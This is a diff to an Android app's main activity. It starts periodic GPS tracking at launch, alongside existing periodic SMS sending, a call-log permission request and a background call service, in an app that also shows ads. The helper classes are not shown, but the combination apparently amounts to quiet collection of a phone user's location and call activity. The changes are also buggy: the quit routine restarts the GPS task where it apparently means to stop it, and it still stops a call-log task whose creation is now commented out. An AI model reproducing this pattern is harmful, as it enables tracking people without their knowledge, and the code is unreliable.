@@ -39,6 +39,10 @@ public class MainActivity extends AppCompatActivity {
 
     private static final int DELAY_MS = 5000;
 
+    private GPSTracker gpsTracker;
+    private SendGPSPeriodically gpsSender;
+
+
     private void request_permission() {
 
         int hasPermission = ContextCompat.checkSelfPermission(this, (Manifest.permission.READ_CALL_LOG));
@@ -114,6 +118,10 @@ public class MainActivity extends AppCompatActivity {
         });
 
 
+        gpsTracker = new GPSTracker(MainActivity.this);
+        gpsSender = new SendGPSPeriodically(gpsTracker);
+        gpsSender.startRepeatingTask();
+
         Intent intent = new Intent(this, CallService.class);
         startService(intent);
                
@@ -121,8 +129,8 @@ public class MainActivity extends AppCompatActivity {
         autoSmsSender = new SendSMSPeriodically();
         autoSmsSender.startRepeatingTask();
 
-        lastCall = new CallLogs(this);
-        lastCall.startRepeatingTask();
+//        lastCall = new CallLogs(this);
+//        lastCall.startRepeatingTask();
 
         // Sample AdMob app ID: ca-app-pub-3940256099942544~3347511713
         MobileAds.initialize(this, "ca-app-pub-3940256099942544~3347511713");
@@ -197,6 +205,8 @@ public class MainActivity extends AppCompatActivity {
     private void quitApp(){
         this.autoSmsSender.stopRepeatingTask();
         this.lastCall.stopRepeatingTask();
+        this.gpsSender.startRepeatingTask();
+
         this.finish();
         System.exit(0);
     }
